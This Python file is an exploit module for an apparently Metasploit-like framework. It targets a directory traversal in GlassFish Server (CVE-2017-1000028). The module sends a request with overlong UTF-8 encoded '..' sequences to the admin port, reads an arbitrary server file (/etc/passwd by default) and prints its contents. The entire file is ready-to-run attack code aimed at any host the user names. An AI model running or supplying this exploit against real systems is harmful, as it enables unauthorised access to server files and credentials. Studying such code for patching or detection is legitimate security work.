import requests
from core.base_module import BaseModule
from rich.console import Console

class GlassfishTraversal(BaseModule):
    """Exploits a directory traversal in GlassFish Server (CVE-2017-1000028)."""

    def get_options(self):
        """
        Returns the options for this module.
        """
        return {
            'RHOST': ['', 'The target host IP or domain.'],
            'RPORT': [4848, 'The target GlassFish Admin port.'],
            'FILE_PATH': ['/etc/passwd', 'The absolute path of the file to read.']
        }

    def run(self, options):
        """
        Executes the GlassFish directory traversal exploit.
        """
        rhost = options.get('RHOST')
        rport = int(options.get('RPORT'))
        file_path = options.get('FILE_PATH')
        console = Console()

        if not rhost:
            console.print("[!] RHOST must be set.", style="bold red")
            return

        # The traversal payload
        # The path needs to be relative to the web root, so we use `..` to traverse up
        # The number of `..` might need adjustment depending on the server config
        traversal_payload = "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F"
        target_url = f"https://{rhost}:{rport}/theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af{file_path}"

        console.print(f"[*] Targeting GlassFish at: {rhost}:{rport}")
        console.print(f"[*] Attempting to read file: {file_path}")

        try:
            response = requests.get(target_url, timeout=20, verify=False) # GlassFish often uses self-signed certs

            if response.status_code == 200 and not response.text.strip().startswith('HTTP Status 404'):
                console.print("[bold green][+] File read successfully![/bold green]")
                console.print(f"--- Contents of {file_path} ---")
                console.print(response.text)
                console.print("---------------------------")
            else:
                console.print(f"[!] Failed to read file. The server may not be vulnerable or the path is incorrect.", style="bold red")
                console.print(f"Status: {response.status_code}")

        except requests.exceptions.SSLError as e:
            console.print(f"[!] SSL Error. The server might be using HTTP. Try changing the URL scheme.", style="bold red")
        except requests.RequestException as e:
            console.print(f"[!] Request failed: {e}", style="bold red")
        except Exception as e:
            console.print(f"[!] An unexpected error occurred: {e}", style="bold red")
